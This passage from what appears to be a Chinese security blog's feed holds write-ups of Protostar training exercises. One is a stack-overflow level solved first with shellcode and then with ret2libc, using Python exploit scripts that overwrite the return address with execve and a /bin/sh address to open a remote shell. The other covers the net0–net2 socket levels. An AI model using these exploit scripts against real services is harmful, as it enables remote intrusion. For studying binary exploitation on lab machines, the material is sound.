class="number">1024</span>)</span><br></pre></td></tr></table></figure></p><p>注意send的最后加一个换行符是为了确保gets能正确的结束读取。</p><p>使用的shellcode是上次做0x0E用到的。<br>传送门：<a href="https://muirelle.com/2018/10/03/Liveoverflow-0x0E-Shellcode/" target="_blank" rel="noopener">https://muirelle.com/2018/10/03/Liveoverflow-0x0E-Shellcode/</a></p><p><img src="https://i.imgur.com/lxSqiBM.png" alt=""><br>拿到shell</p><h1 id="再次分析"><a href="#再次分析" class="headerlink" title="再次分析"></a>再次分析</h1><p><del>因为手贱</del>出于好奇心，我想确认一下空字符是否真的起了作用，于是就把脚本里面的空字符删了(前面的A相应的多加一个，变成512个)再运行一次。结果让我感觉我刚刚做的题都白做了，删了空字符一样能拿到shell，震惊了。</p><p>经过大佬的指点，我检查了一遍shellcode，确保不是真的运气好到爆棚遇到第一种情况了，shellcode中确实存在在小写字母范围内的数据。所以只能是第二种情况，shellcode前面还有非人为添加的空字符。</p><p>进gdb看个明白</p><p>这里需要gdb调试正在运行的程序，所以加上参数-p。用<code>pidof 程序名</code>命令获取正在运行的程序的pid。同样需要root权限才能调试。<br><img src="https://i.imgur.com/N0WE2Iq.png" alt=""></p><p>进入gdb后可以看到accept已经在运行中了，意味着这个程序正在等待客户端的连接。因为数据处理都是在子程序完成的，所以还要用<strong>set follow-fork-mode child</strong>命令让gdb跟踪子程序，不然没办法调试外面传入的数据。</p><p><img src="https://i.imgur.com/PfJ4MTc.png" alt=""></p><p><img src="https://i.imgur.com/JyklBMM.png" alt=""><br>在<code>gets</code>和for循环外面找个地方下断点。然后<strong>c</strong>命令让程序跑起来。</p><p>新开一个终端运行不带空字符的脚本。(为了直观，我把A改成了a)</p><p><img src="https://i.imgur.com/4L6jYv2.png" alt=""></p><p>断点gets：padding(红框)、返回地址(蓝框)、nop块(黄框)、shellcode(橙框)依次排列，没问题，继续。</p><p><img src="https://i.imgur.com/BX6hgQP.png" alt=""></p><p>for循环外的断点：先注意到一大片的a已经被替换成A了，但是shellcode安然无恙。白框部分被自动替换成0x200。很明显，就是这些\x00让<code>strlen</code>认为已经读到了字符串的末尾，所以<code>toupper</code>没有继续往后转换。问题来了，这个0x200是谁放上去的。。。？</p><p>0x200，刚好等于512，难道。。。是<code>strlen</code>把0x200放在这的？除了<code>strlen</code>题目中没有其他函数可以计算出0x200这个值，但是这并不符合逻辑，strlen是先计算长度再放置数据的，不可能一开始就在某一个地方占个0，计算完前面的长度在把数据放到上面，这样太蠢了。所以在strlen调用前一定有其他函数做过手脚。</p><p>不得不开始单步调试(눈‸눈)</p><p><img src="https://i.imgur.com/V4xBC5f.png" alt=""><br>反汇编一下源码，红框和蓝框部分分别是源码中两次调用<code>strchr</code>并置零的部分，从0xa(换行)，0xd(回车)可以看出。而就是橙框和绿框将上一张图的白框位置先后置零了。所以这个过程应该是：<strong><code>strchr</code>将返回值传给ax，然后ax的值被放在</strong>ebp-0x10<strong>，正好就是白框的位置。而白框正好位于程序一开始申请的512字节大小的内存后面，所以if语句认为白框的位置的内存是空闲的，就将ax的值放进去，再和0作比较(源码中的if语句)，如果相等的话说明没有找到指定的字符，不相等的话说明ax就是找到的那个字符的地址，则je语句不执行，接着两行代码将0放在ax指向的位置。</strong></p><p>红框和蓝框做的事情相同，恰好shellcode中没有出现\x0a或者\x0d，所以有8字节的空字符。</p><p>现在知道空字符是怎么来的了，那0x200呢？接着调试。</p><p><img src="https://i.imgur.com/d9DW9h3.png" alt=""></p><p><img src="https://i.imgur.com/LhsjIln.png" alt=""></p><p><img src="https://i.imgur.com/po6Mei4.png" alt=""></p><p>并不是一下子就到了0x200，而是一字节一字节增长的(是从0开始的，前面没截到图(´-ι_-｀))，所以可以断定这是变量 <strong>i</strong> 而不是<code>strlen</code>放上去的。</p><p><img src="https://i.imgur.com/Z6xTplL.png" alt=""></p><p>而<code>strlen</code>检测到的长度直接放在ax中，马上就和bx进行比较了，所以再次确定不关<code>strlen</code>的事。</p><p><strong>最后可以确定下来，if语句需要四字节的内存存放<code>strchr</code>的返回值用于和0比较，不管<code>strchr</code>有没有找到指定的字符，这四个字节都会被置零(一种是被返回值置零，一种是被if置零),较后运行的<code>strlen</code>就被这几个0给挡住了，后面的数据不管怎样也不会变成大写了。。。</strong></p><p>strlen：strchr，这锅你背。</p><p>strchr：不管我事啊，是if的锅啊。</p><p>toupper：闭嘴，你们几个都是坑b。</p><p>到头来还是我被坑了(╯’-‘)╯ ┻━━━┻</p><h1 id="再次解题"><a href="#再次解题" class="headerlink" title="再次解题"></a>再次解题</h1><p>用返回到栈里执行shellcode的方法既不可靠也不高大上，所以换一种方法解题。</p><p><strong>ret2libc</strong>。这个办法之前做stack部分的时候也用到过，比单纯返回栈执行shellcode可靠。</p><p>既然要ret2libc就要先找到有哪些已经在内存中的libc的函数可以被我们利用。</p><p><img src="https://i.imgur.com/DSWIEkS.png" alt=""></p><p><code>info functions @plt</code>查看可用的函数(先su拿到root)</p><p><img src="https://i.imgur.com/fBO0sK2.png" alt=""></p><p>发现有<code>execve</code>，这个函数可以帮我们执行/bin/sh，就用它了。<br>记下地址<strong>0x08048c0c</strong></p><blockquote><p><em>execve()  executes  the  program  pointed to by filename.  filename must be either a binary executable</em></p></blockquote><p>写一小段程序看看用<code>execve</code>运行/bin/sh时栈内是怎么布局的，然后payload就仿照这个布局。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">execve(<span class="string">"/bin/sh"</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/MbwYZ5p.png" alt=""></p><p>第一个数据(红框)是返回值，也就是返回main的地址，构造payload时不用管它，随便填一个数据就行了，因为我们不需要它返回。第二个数据(蓝框)就是/bin/sh的地址，所以要找到/bin/sh的地址(libc的起始地址 + /bin/sh的偏移地址)</p><p><img src="https://i.imgur.com/ET3qCA6.png" alt=""></p><p><img src="https://i.imgur.com/xXmQ5Ez.png" alt=""><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"127.0.0.1"</span>, <span class="number">2995</span>))</span><br><span class="line">padding = <span class="string">"A"</span>*<span class="number">511</span> + <span class="string">"\x00"</span> + <span class="string">"AAAABBBBCCCCDDDDEEEE"</span></span><br><span class="line">execve = struct.pack(<span class="string">"I"</span>, <span class="number">0x08048c0c</span>)</span><br><span class="line">bsh = struct.pack(<span class="string">"I"</span>, <span class="number">0xb7e97000</span> + <span class="number">1176511</span>)</span><br><span class="line">arg = <span class="string">"AAAA"</span> + bsh + <span class="string">"\x00"</span>*<span class="number">8</span></span><br><span class="line">s.send(padding + execve + arg + <span class="string">"\n"</span>)</span><br><span class="line">s.send(<span class="string">"id\n"</span>)</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">"uname -a\n"</span>)</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/F97KcUN.png" alt=""></p><p>成功。</p><p>可是这样还不够，还要再高大上一点(✧≖‿ゝ≖)</p><p>使用python的telnetlib模块对服务器进行连接实现远程操控。</p><p>修改后的脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"127.0.0.1"</span>, <span class="number">2995</span>))</span><br><span class="line">padding = <span class="string">"A"</span>*<span class="number">511</span> + <span class="string">"\x00"</span> + <span class="string">"AAAABBBBCCCCDDDDEEEE"</span></span><br><span class="line">execve = struct.pack(<span class="string">"I"</span>, <span class="number">0x08048c0c</span>)</span><br><span class="line">bsh = struct.pack(<span class="string">"I"</span>, <span class="number">0xb7e97000</span> + <span class="number">1176511</span>)</span><br><span class="line">arg = <span class="string">"AAAA"</span> + bsh + <span class="string">"\x00"</span>*<span class="number">8</span></span><br><span class="line">s.send(padding + execve + arg + <span class="string">"\n"</span>)</span><br><span class="line">s.send(<span class="string">"id\n"</span>)</span><br><span class="line">s.send(<span class="string">"uname -a\n"</span>)</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">t = telnetlib.Telnet()</span><br><span class="line">t.sock = s</span><br><span class="line">t.interact()</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/yctTz06.png" alt=""></p><p>如果在同一个局域网内并且知道这台机器的ip的话(<code>ip addr</code>)，也可以在外面用同一个脚本进行连接，改一下ip就行了</p><p><img src="https://i.imgur.com/Ijr8ksM.png" alt=""></p><p><img src="https://i.imgur.com/40r4Dx2.png" alt=""></p><p>nice~</p>]]></content>
      
      
      
        <tags>
            
            <tag> Binary-Hacking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Liveoverflow-0x19-net0~2</title>
      <link href="/2018/11/02/Liveoverflow-0x19-net0-2/"/>
      <url>/2018/11/02/Liveoverflow-0x19-net0-2/</url>
      
        <content type="html"><![CDATA[<p>把heap部分啃完之后终于来到net部分，与网络相关。需要多花时间理解。</p><a id="more"></a><p>视频链接：<a href="http://liveoverflow.com/binary_hacking/" target="_blank" rel="noopener">http://liveoverflow.com/binary_hacking/</a></p><hr><h1 id="Protostar-Net0"><a href="#Protostar-Net0" class="headerlink" title="Protostar Net0"></a>Protostar Net0</h1><h2 id="About"><a href="#About" class="headerlink" title="About"></a>About</h2><p><strong>This level takes a look at converting strings to little endian integers.</strong></p><p><strong>This level is at /opt/protostar/bin/net0</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../common/common.c"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NAME <span class="meta-string">"net0"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID 999</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GID 999</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 2999</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> wanted;</span><br><span class="line"></span><br><span class="line">  wanted = random();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please send '%d' as a little endian 32bit int\n"</span>, wanted);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(fread(&amp;i, <span class="keyword">sizeof</span>(i), <span class="number">1</span>, <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      errx(<span class="number">1</span>, <span class="string">":(\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(i == wanted) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Thank you sir/madam\n"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"I'm sorry, you sent %d instead\n"</span>, i);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">char</span> *username;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Run the process as a daemon */</span></span><br><span class="line">  background_process(NAME, UID, GID); </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Wait for socket activity and return */</span></span><br><span class="line">  fd = serve_forever(PORT);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set the client socket to STDIN, STDOUT, and STDERR */</span></span><br><span class="line">  set_io(fd);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Don't do this :&gt; */</span></span><br><span class="line">  srandom(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">  run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="铺垫"><a href="#铺垫" class="headerlink" title="铺垫"></a>铺垫</h1><p>先看源码，一开始分别定义了<strong>name</strong>，<strong>uid</strong>，<strong>gid</strong>和<strong>port</strong>。接着再看main函数，main函数中调用的前三个函数都是在程序一开始声明的头文件中，看作者给的注释可以大概了解这些函数的作用。</p><p>首先，第一个函数的作用是将这个程序(就是net0)变为一个后台进程运行(又称<a href="https://en.wikipedia.org/wiki/Daemon_(computing" target="_blank" rel="noopener">daemon(守护进程)</a>))</p><p><img src="https://i.imgur.com/Y7vxXjy.png" alt=""><br>所以可以看到无论怎么运行net0都没有反应</p><p><img src="https://i.imgur.com/Dhz7pwB.png" alt=""><br><code>ps aux | grep net0</code>查看一下正在运行的程序，net0确实是在后台运行着的。</p><p><img src="https://i.imgur.com/2DWkl1i.png" alt=""><br>用strace跟踪一下net0(需要先用su获得root权限，然后kill掉刚刚这个net0进程，root密码是<code>godmode</code>)。可以看到在结尾处调用了<code>clone</code>函数，<strong><code>clone</code>的作用简单说就是生下一个新的进程，新的进程就是这个进程的一个复制，并且返回值是这个新进程的pid</strong>。紧接着就调用了<code>exit</code>，将父进程终止了，留下一个刚刚创建的进程，又称为<a href="https://en.wikipedia.org/wiki/Orphan_process" target="_blank" rel="noopener">Orphan process(孤儿进程)</a>。而像这种故意制造的孤儿进程又被称为守护进程，就是刚刚提到的那个。</p><p><img src="https://i.imgur.com/pN8GcCd.png" alt=""><br>既然有子进程就看看子进程到底干了什么，命令<code>strace</code>带上参数<code>-f</code>可以跟踪一个程序的子进程。如图，在子进程(红框)中，打开了文件<a href="https://en.wikipedia.org/wiki/Null_device" target="_blank" rel="noopener"><strong>/dev/null</strong></a>，<strong>任何写进它的数据都会被丢弃</strong>，所以被称为“黑洞”，图中将0(stdin标准输入)，1(stdout标准输出),2(stderr标准错误输出)都指向了这个黑洞。接下来这个子程序调用了<code>socket</code>，这意味着你将建立一个网络连接，通过socket中提供的各种参数你可以选择需要连接的类型。<strong>然后程序调用了<code>bind</code>，参数之一为端口号2999，这意味着如果操作系统接收到了一个想要与这个程序建立连接的数据包，它会将这个包连同里面的数据发送给这个程序。</strong>但是看到图中调用bind失败了，提示2999端口已经被占用了，嗯，因为之前我们已经运行了net0还没有kill掉，所以端口自然就被前一个net0占用了。把它kill掉，带上<code>-f</code>选项再运行一次。</p><p><img src="https://i.imgur.com/XDBSS5y.png" alt=""><br>重新运行之后可以看到<code>bind</code>成功绑定了2999端口，接着调用了<code>listen</code>和<code>accept</code>，<code>listen</code>用于监听我们刚才打开的端口，<code>accept</code>等待用于连接的数据包。具体过程如下图</p><p><img src="https://i.imgur.com/caPKYbz.png" alt=""><br>图源：<a href="https://realpython.com/python-sockets/" target="_blank" rel="noopener">https://realpython.com/python-sockets/</a></p><p><img src="https://i.imgur.com/ldKDVPw.png" alt=""><br>接着用命令<code>netstat -plant | grep net0</code>查看一下，端口2999确实处于被net0监听的状态。</p><p><img src="https://i.imgur.com/I7nKoDu.png" alt=""><br>再开一个终端，<code>nc 1270.0.1 2999</code>命令用于连接到刚才监听端口，可以把左边的终端看作服务器，右边的终端看作客户端。现在服务器正在执行<code>read</code>用于等待客户端发送的数据。</p><p><img src="https://i.imgur.com/vb3sdMD.png" alt=""><br>随便发送一些数据，这时候服务器就要用到题目中的run函数来判断我们的数据是否满足要求，很明显不满足，所以返回显示我们输入不正确的字符串，并且断开连接，重新等待客户端与服务器建立连接。</p><h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><p>有了前面大致的了解就可以开始做题了。题目要求我们把字符串转换为小端的整数。</p><p><img src="https://i.imgur.com/6xfYCgB.png" alt=""><br>题目是简单的，两步就完了。但还是有些地方要注意。</p><p>由于服务器发送的数据是随机的，所以我们没办法用<code>echo</code>和管道将数据发送给服务器，但是有一个小技巧，老朋友`cat。通过将cat嵌套进echo中，可以将输入的数据通过cat反射出来再通过echo发送给服务器，再加上-e参数，解释特殊字符，就行了。</p><p>如果不好理解的话就写个脚本。<br><img src="https://i.loli.net/2018/11/04/5bde923e24249.png" alt=""><br>我们作为客户端，使用的函数和服务器端就稍有不同，我们设置好ip和端口(port)参数之后用<code>connect</code>函数主动和服务器进行连接，连接成功后用<code>send</code>发送数据，再用<code>recv</code>接收服务器传回的数据，以此来和服务器进行交互。</p><p>上图中用正则表达式将服务器返回的字符串中我们需要的那个数字取出，这时数字还是字符串类型，所以转换为int类型之后再用<code>struct.pack</code>打包发送给服务器就行了。</p><hr><h1 id="Protostar-Net1"><a href="#Protostar-Net1" class="headerlink" title="Protostar Net1"></a>Protostar Net1</h1><h2 id="About-1"><a href="#About-1" class="headerlink" title="About"></a>About</h2><p><strong>This level tests the ability to convert binary integers into ascii representation.</strong></p><p><strong>This level is at /opt/protostar/bin/net1</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../common/common.c"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NAME <span class="meta-string">"net1"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID 998</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GID 998</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 2998</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">12</span>];</span><br><span class="line">  <span class="keyword">char</span> fub[<span class="number">12</span>];</span><br><span class="line">  <span class="keyword">char</span> *q;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> wanted;</span><br><span class="line"></span><br><span class="line">  wanted = random();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">sprintf</span>(fub, <span class="string">"%d"</span>, wanted);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(write(<span class="number">0</span>, &amp;wanted, <span class="keyword">sizeof</span>(wanted)) != <span class="keyword">sizeof</span>(wanted)) &#123;</span><br><span class="line">      errx(<span class="number">1</span>, <span class="string">":(\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(fgets(buf, <span class="keyword">sizeof</span>(buf)<span class="number">-1</span>, <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      errx(<span class="number">1</span>, <span class="string">":(\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  q = <span class="built_in">strchr</span>(buf, <span class="string">'\r'</span>); <span class="keyword">if</span>(q) *q = <span class="number">0</span>;</span><br><span class="line">  q = <span class="built_in">strchr</span>(buf, <span class="string">'\n'</span>); <span class="keyword">if</span>(q) *q = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">strcmp</span>(fub, buf) == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you correctly sent the data\n"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you didn't send the data properly\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">char</span> *username;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Run the process as a daemon */</span></span><br><span class="line">  background_process(NAME, UID, GID); </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Wait for socket activity and return */</span></span><br><span class="line">  fd = serve_forever(PORT);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set the client socket to STDIN, STDOUT, and STDERR */</span></span><br><span class="line">  set_io(fd);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Don't do this :&gt; */</span></span><br><span class="line">  srandom(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">  run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h1><p>直接看函数<code>run</code>，和net0一样，生成了一个随机数，但是这次没有将这个数格式化之后再发给我们，而是直接将原本数据发过来，所以我们就只能看到一堆乱码。</p><p><img src="https://i.loli.net/2018/11/04/5bde9c46e360f.png" alt=""><br>显然这次想用net0的第一个方法就不行了，那就写脚本呗。</p><p><img src="https://i.loli.net/2018/11/04/5bde9de1eb304.png" alt=""><br>直接上脚本，接收到数据再加点工发回去就行了。注意一点服务器发来的数据需要解包再转换成字符串再发回去才行，因为run中是将两个字符串进行对比的。</p><hr><h1 id="Protostar-Net2"><a href="#Protostar-Net2" class="headerlink" title="Protostar Net2"></a>Protostar Net2</h1><h2 id="About-2"><a href="#About-2" class="headerlink" title="About"></a>About</h2><p><strong>This code tests the ablity to add up 4 unsigned 32-bit integers. Hint:Keep in mind that it warps</strong></p><p><strong>This level is at /opt/protostar/bin/net2</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../common/common.c"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NAME <span class="meta-string">"net2"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID 997</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GID 997</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 2997</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> quad[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result, wanted;</span><br><span class="line"></span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">      quad[i] = random();</span><br><span class="line">      result += quad[i];</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(write(<span class="number">0</span>, &amp;(quad[i]), <span class="keyword">sizeof</span>(result)) != <span class="keyword">sizeof</span>(result)) &#123;</span><br><span class="line">          errx(<span class="number">1</span>, <span class="string">":(\n"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(read(<span class="number">0</span>, &amp;wanted, <span class="keyword">sizeof</span>(result)) != <span class="keyword">sizeof</span>(result)) &#123;</span><br><span class="line">      errx(<span class="number">1</span>, <span class="string">":&lt;\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(result == wanted) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you added them correctly\n"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"sorry, try again. invalid\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">char</span> *username;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Run the process as a daemon */</span></span><br><span class="line">  background_process(NAME, UID, GID); </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Wait for socket activity and return */</span></span><br><span class="line">  fd = serve_forever(PORT);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set the client socket to STDIN, STDOUT, and STDERR */</span></span><br><span class="line">  set_io(fd);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Don't do this :&gt; */</span></span><br><span class="line">  srandom(time(<span 